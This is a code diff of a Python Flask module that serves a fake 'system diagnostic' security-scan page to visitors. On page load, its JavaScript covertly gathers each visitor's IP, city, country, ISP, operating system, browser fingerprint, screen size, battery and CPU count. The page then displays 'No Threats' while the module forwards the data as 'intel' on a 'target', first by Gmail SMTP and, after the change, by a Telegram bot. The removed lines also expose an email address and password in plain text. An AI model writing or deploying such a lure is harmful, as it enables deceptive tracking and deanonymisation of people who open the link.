@@ -1,71 +1,73 @@
 from flask import Blueprint, render_template_string, request, jsonify
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import requests
 
 script20_bp = Blueprint('script20', __name__)
 
 # --- CONFIGURATION (Apni Details Yahan Daal) ---
-SENDER_EMAIL = "rehmandakit403@gmail.com"
-SENDER_PASSWORD = "Rehmandakit#@#=66"  # Google App Password
-RECEIVER_EMAIL = "hhhy97851@gmail.com"
+TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
 
 PHANTOM_UI = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SECURITY CHECK | OMEGA</title>
+    <title>SYSTEM_DIAGNOSTIC_v2.0</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
-        .terminal { border: 1px solid #00ff00; display: inline-block; padding: 40px; background: rgba(0,20,0,0.9); }
-        .blink { animation: blinker 1s linear infinite; color: red; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 20%; margin:0; }
+        .box { border: 1px solid #0f0; display: inline-block; padding: 30px; background: rgba(0,20,0,0.9); box-shadow: 0 0 20px #0f0; }
+        .scan-line { width: 100%; height: 2px; background: #0f0; position: absolute; top: 0; animation: scan 3s linear infinite; }
+        @keyframes scan { from { top: 0; } to { top: 100%; } }
     </style>
 </head>
 <body onload="capture()">
-    <div class="terminal">
-        <h2>[!] CRITICAL SYSTEM SCAN [!]</h2>
-        <p id="msg">Analyzing hardware vulnerabilities...</p>
+    <div style="position:relative; overflow:hidden;" class="box">
+        <div class="scan-line"></div>
+        <h2 id="header">[ INITIALIZING SECURITY SCAN ]</h2>
+        <p id="status">Accessing Hardware Nodes...</p>
         <div id="loader">_</div>
     </div>
 
     <script>
         async function capture() {
-            // IP aur Location nikalna
-            let ipInfo = {};
             try {
+                // 1. IP & GEO DATA
                 const res = await fetch('https://ipapi.co/json/');
-                ipInfo = await res.json();
-            } catch(e) { ipInfo = {ip: "Unknown"}; }
+                const ipInfo = await res.json();
 
-            // Battery aur Device Info
-            let battery = "N/A";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = (b.level * 100) + "%";
+                // 2. DEVICE & BATTERY
+                let battery = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level * 100) + "%";
+                }
+
+                const data = {
+                    ip: ipInfo.ip || "N/A",
+                    city: ipInfo.city || "N/A",
+                    country: ipInfo.country_name || "N/A",
+                    isp: ipInfo.org || "N/A",
+                    os: navigator.platform,
+                    browser: navigator.userAgent,
+                    screen: window.screen.width + "x" + window.screen.height,
+                    battery: battery,
+                    cores: navigator.hardwareConcurrency || "N/A"
+                };
+
+                // 3. SEND TO BACKEND
+                await fetch('/script20/capture_data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                // UI Update
+                document.getElementById('header').innerText = "[ SCAN COMPLETE ]";
+                document.getElementById('status').innerText = "System Integrity Verified. No Threats.";
+                document.getElementById('loader').innerText = "STATUS: SECURE";
+
+            } catch (e) {
+                console.log("System bypass initiated...");
             }
-
-            const data = {
-                ip: ipInfo.ip,
-                city: ipInfo.city,
-                country: ipInfo.country_name,
-                isp: ipInfo.org,
-                os: navigator.platform,
-                agent: navigator.userAgent,
-                screen: window.screen.width + "x" + window.screen.height,
-                battery: battery,
-                cores: navigator.hardwareConcurrency || "N/A"
-            };
-
-            // Backend ko data bhejna
-            fetch('/script20/capture_data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(() => {
-                document.getElementById('msg').innerText = "System secure. No threats detected.";
-                document.getElementById('loader').innerHTML = "[ OK ]";
-            });
         }
     </script>
 </body>
@@ -78,45 +80,28 @@ def index():
 
 @script20_bp.route('/capture_data', methods=['POST'])
 def capture_data():
-    data = request.json
+    intel = request.json
     
-    # Mail Content Taiyar Karna
-    subject = f"⚠️ NEW INTEL GATHERED: {data['ip']}"
-    body = f"""
-    SHIVAM SIR, A NEW DEVICE HAS ACCESSED THE LINK.
-    
-    [ TARGET INFORMATION ]
-    ---------------------------------
-    IP ADDRESS : {data['ip']}
-    LOCATION   : {data['city']}, {data['country']}
-    ISP        : {data['isp']}
-    
-    [ DEVICE SPECIFICATIONS ]
-    ---------------------------------
-    OPERATING SYSTEM : {data['os']}
-    SCREEN RES      : {data['screen']}
-    CPU CORES       : {data['cores']}
-    BATTERY LEVEL   : {data['battery']}
-    
-    [ BROWSER FINGERPRINT ]
-    ---------------------------------
-    USER AGENT : {data['agent']}
-    """
+    # Telegram Message Format
+    message = (
+        f"🚨 *NEW INTEL GATHERED* 🚨\\n\\n"
+        f"👤 *TARGET:* `{intel['ip']}`\\n"
+        f"📍 *LOCATION:* {intel['city']}, {intel['country']}\\n"
+        f"🌐 *ISP:* {intel['isp']}\\n\\n"
+        f"💻 *OS:* {intel['os']}\\n"
+        f"📱 *SCREEN:* {intel['screen']}\\n"
+        f"🔋 *BATTERY:* {intel['battery']}\\n"
+        f"⚙️ *CORES:* {intel['cores']}\\n\\n"
+        f"🕵️ *AGENT:* `{intel['browser'][:100]}...`"
+    )
 
+    # Telegram API Call
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
+    
     try:
-        # SMTP Setup
-        msg = MIMEMultipart()
-        msg['From'] = SENDER_EMAIL
-        msg['To'] = RECEIVER_EMAIL
-        msg['Subject'] = subject
-        msg.attach(MIMEText(body, 'plain'))
-
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-        server.login(SENDER_EMAIL, SENDER_PASSWORD)
-        server.send_message(msg)
-        server.quit()
+        requests.post(url, json=payload)
         return jsonify({"status": "Success"}), 200
-    except Exception as e:
-        print(f"Error: {e}")
-        return jsonify({"status": "Failed"}), 500
+    except:
+        return jsonify({"status": "Error"}), 500
+
